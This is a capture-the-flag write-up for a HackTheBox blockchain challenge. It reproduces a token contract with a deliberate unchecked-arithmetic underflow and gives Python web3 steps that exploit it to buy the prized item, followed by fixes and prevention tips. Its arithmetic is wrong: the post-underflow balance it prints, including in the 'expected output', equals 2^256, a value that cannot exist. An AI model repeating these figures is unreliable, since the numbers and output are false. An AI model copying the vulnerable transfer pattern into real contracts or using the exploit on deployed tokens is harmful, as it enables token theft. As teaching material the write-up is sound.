# Token to Wonderland — HackTheBox Blockchain Challenge Writeup

**Challenge**: Token to Wonderland  
**Difficulty**: Easy  
**Category**: Blockchain  

---

## Challenge Description

> The group was excited as they pored over the map they had found inside the magic vault. It was an ancient, hand-drawn map, created by a well-known and respected map maker. The map led to a secret treasure, hidden away in a distant land. The group was also thrilled to find a large stash of silver coins in the magic vault. These would be invaluable on their journey to the treasure. After weeks of travel, they finally arrived at the map maker's shop. It was an old, run-down building, located in a remote village. Inside, they found an old dwarf, bent over a counter filled with precious artifacts and items from all over the world. The group approached the old dwarf and showed him the map. His eyes lit up as he recognized his own work. "I see you've found one of my maps," he said. "But do you have the first key that you'll need to open the treasure?" The group shook their heads, unsure of what he was talking about. The dwarf chuckled and explained that the treasure was guarded by powerful magic, and could only be unlocked with 3 special keys. He had the first key, he said, but he wouldn't part with it for free. The group was dismayed to hear this. They had spent all of their silver coins on supplies for the journey, and had nothing left to offer the old dwarf. But they were determined to find the treasure, and they knew that they would have to find a way to get the key from the old dwarf.

This challenge teaches about integer underflow vulnerabilities in ERC20 token implementations using unchecked arithmetic.

---

## Initial Reconnaissance

After spawning the instance, I got:
- RPC URL
- Private key
- Player address
- Setup contract address
- Target contract address (Shop)

The challenge provides three contract files:

### Setup.sol
```solidity
pragma solidity ^0.8.13;

import {Shop} from "./Shop.sol";

contract Setup {
    Shop public immutable TARGET;

    constructor() payable {
        TARGET = new Shop();
        TARGET.startSale(msg.sender);
    }

    function isSolved(address _player) public view returns (bool) {
        return TARGET.itemOf(_player) == 2;
    }
}
```

Win condition: Own item #2 (the Golden Key).

### Shop.sol
```solidity
pragma solidity ^0.8.13;

import {SilverCoin} from "./SilverCoin.sol";

contract Shop {
    SilverCoin public silverCoin;

    struct Item {
        string name;
        uint256 price;
        address owner;
    }

    Item[] public items;

    constructor() {
        silverCoin = new SilverCoin();
    }

    function startSale(address _player) external {
        silverCoin.transfer(_player, 100);
        items.push(Item("Healing Potion", 50, address(this)));
        items.push(Item("Scroll of Wisdom", 150, address(this)));
        items.push(Item("Golden Key", 25_000_000, address(this)));
    }

    function buyItem(uint256 _index) external {
        Item storage item = items[_index];
        require(item.owner == address(this), "Item not for sale");
        silverCoin.transferFrom(msg.sender, address(this), item.price);
        item.owner = msg.sender;
    }

    function viewItem(uint256 _index) external view returns (string memory, uint256, address) {
        Item memory item = items[_index];
        return (item.name, item.price, item.owner);
    }

    function itemOf(address _player) external view returns (uint256) {
        for (uint256 i = 0; i < items.length; i++) {
            if (items[i].owner == _player) {
                return i;
            }
        }
        return type(uint256).max;
    }
}
```

The shop has three items:
- Item 0: Healing Potion (50 SLV)
- Item 1: Scroll of Wisdom (150 SLV)
- Item 2: Golden Key (25,000,000 SLV) ← We need this!

We start with only 100 SLV, so we can't afford the Golden Key... or can we?

### SilverCoin.sol
```solidity
pragma solidity ^0.8.13;

contract SilverCoin {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    uint256 public totalSupply;

    constructor() {
        totalSupply = 30_000_000;
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0), "Invalid address");
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowances[msg.sender][_spender] = _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_value <= allowances[_from][msg.sender], "Insufficient allowance");
        allowances[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) internal {
        unchecked {
            balances[_from] -= _value;
            balances[_to] += _value;
        }
    }
}
```

---

## Analyzing the Vulnerability

The critical vulnerability is in the `_transfer` function:

```solidity
function _transfer(address _from, address _to, uint256 _value) internal {
    unchecked {
        balances[_from] -= _value;
        balances[_to] += _value;
    }
}
```

Wait... `unchecked`?! That's the key!

### Understanding `unchecked`

In Solidity 0.8+, arithmetic operations automatically check for overflow/underflow and revert on error. But the `unchecked` block disables these safety checks for gas optimization.

This means if we transfer more tokens than we have, instead of reverting, the subtraction will underflow:

```
100 - 25,000,000 = (wraps around) = 115792089237316195423570985008687907853269984665640564039457584007913129639936
```

That's `2^256 - 24999900` - basically unlimited tokens!

### The Exploit Path

1. We start with 100 SLV
2. We transfer 25,000,000 SLV to the shop (more than we have)
3. Due to the `unchecked` block, our balance underflows to a massive number
4. We approve the shop to spend our tokens
5. We buy the Golden Key for 25,000,000 SLV
6. Challenge solved!

### Why This Works

The `transfer` function has no balance check before calling `_transfer`:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0), "Invalid address");
    _transfer(msg.sender, _to, _value);  // No balance check!
    return true;
}
```

A proper implementation would check:
```solidity
require(balances[msg.sender] >= _value, "Insufficient balance");
```

But since there's no check and `_transfer` uses `unchecked`, we can exploit the underflow.

---

## Exploitation

### Step 1: Read SilverCoin Address from Storage

The `silverCoin` variable is at storage slot 1 (after the items array at slot 0):

```python
storage = w3.eth.get_storage_at(shop_address, 1)
silver_address = Web3.to_checksum_address('0x' + storage.hex()[-40:])
```

### Step 2: Trigger the Underflow

Transfer 25,000,000 tokens to the shop (we only have 100):

```python
silver_contract.functions.transfer(shop_address, 25_000_000).transact()
```

Our balance after this: `115792089237316195423570985008687907853269984665640564039457584007913129639936`

### Step 3: Approve and Buy

Now that we have unlimited tokens:

```python
# Approve shop to spend our tokens
silver_contract.functions.approve(shop_address, 25_000_000).transact()

# Buy the Golden Key (item 2)
shop_contract.functions.buyItem(2).transact()
```

Done! We now own the Golden Key.

---

## Running the Solution

1. **Spawn an HTB instance**
2. **Update the BASE_URL** in `main.py` with your instance endpoint
3. **Run**:

```bash
python main.py
```

### Expected Output

```
Getting connection info...
Connected to blockchain
Player: 0x9303326fAD5B468D59f372aF9f219951692414a6
Shop: 0x8Dac90Bcc51A06167A29ba6104eA8D70e3E9B04D
SilverCoin: 0xd6c38bA4751b5c79d05860C401840Cc59951e6A3

Initial balance: 100 SLV
Golden Key price: 25000000 SLV
Current owner: 0x8Dac90Bcc51A06167A29ba6104eA8D70e3E9B04D

Exploiting integer underflow...
Balance after underflow: 115792089237316195423570985008687907853269984665640564039457584007913129639936 SLV
Approving shop...
Buying Golden Key...

Challenge solved: True
Flag: HTB{...}
```

---

## Key Takeaways

### What I Learned

1. **The `unchecked` keyword is dangerous**: While it saves gas, using `unchecked` without proper validation can lead to critical vulnerabilities.

2. **Always validate input**: Token transfers should check `balances[sender] >= amount` before performing the transfer.

3. **ERC20 implementation matters**: The standard ERC20 interface doesn't enforce implementation details. Many custom implementations have subtle bugs.

4. **Integer underflow still exists**: Even in Solidity 0.8+, you can explicitly disable overflow protection with `unchecked`.

5. **Defense in depth**: Multiple checks at different layers (external function + internal function) provide better security.

### The Bug in Detail

The vulnerability chain:
```
transfer(amount) 
  → No balance check
    → _transfer(from, to, amount)
      → unchecked { balances[from] -= amount; }
        → Underflow if amount > balances[from]
          → from gets ~2^256 tokens
```

### Proper Implementation

Here's how it should be done:

```solidity
function _transfer(address _from, address _to, uint256 _value) internal {
    require(balances[_from] >= _value, "Insufficient balance");
    unchecked {
        balances[_from] -= _value;
        balances[_to] += _value;
    }
}
```

Or just remove `unchecked` and let Solidity handle it:

```solidity
function _transfer(address _from, address _to, uint256 _value) internal {
    balances[_from] -= _value;  // Will revert on underflow
    balances[_to] += _value;
}
```

### Common Patterns

This vulnerability appears in:
- Custom ERC20 implementations trying to optimize gas
- Old token contracts (pre-0.8.0) without SafeMath
- Contracts with arithmetic in `unchecked` blocks

### Prevention Tips

- **Use OpenZeppelin's ERC20**: Battle-tested implementation
- **Avoid `unchecked` unless necessary**: Only use it when you've proven the math can't overflow/underflow
- **Add balance checks**: Validate before state changes
- **Test edge cases**: Try transferring more than balance in tests
- **Use static analysis**: Tools like Slither can catch these issues

---

## Quick Reference

### Contract Addresses
- Setup: From connection_info endpoint
- Shop (Target): From connection_info endpoint
- SilverCoin: Read from Shop's storage slot 1

### Storage Layout (Shop)
```
Slot 0: items array (dynamic array, actual data elsewhere)
Slot 1: silverCoin address ← We read this
```

### Exploit Flow
1. Start with 100 SLV tokens
2. Transfer 25,000,000 SLV to shop → Underflow triggers
3. Balance becomes ~2^256 tokens
4. Approve shop to spend 25,000,000 SLV
5. Buy Golden Key (item 2)
6. Challenge solved!

### Item Indices
```
0: Healing Potion (50 SLV)
1: Scroll of Wisdom (150 SLV)
2: Golden Key (25,000,000 SLV) ← Target
```

### Critical Code
```solidity
// The vulnerable function
function _transfer(address _from, address _to, uint256 _value) internal {
    unchecked {
        balances[_from] -= _value;  // Can underflow!
        balances[_to] += _value;
    }
}
```

---

## Resources

- [Solidity `unchecked` Documentation](https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic)
- [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
- [Integer Overflow and Underflow](https://consensys.github.io/smart-contract-best-practices/attacks/insecure-arithmetic/)
- [SWC-101: Integer Overflow/Underflow](https://swcregistry.io/docs/SWC-101)

**Challenge Rating**: ⭐⭐⭐☆☆ (Easy - Great intro to unchecked arithmetic vulnerabilities)

**Time to Solve**: ~10-15 minutes

---

*Always check your arithmetic, especially when using `unchecked`!*
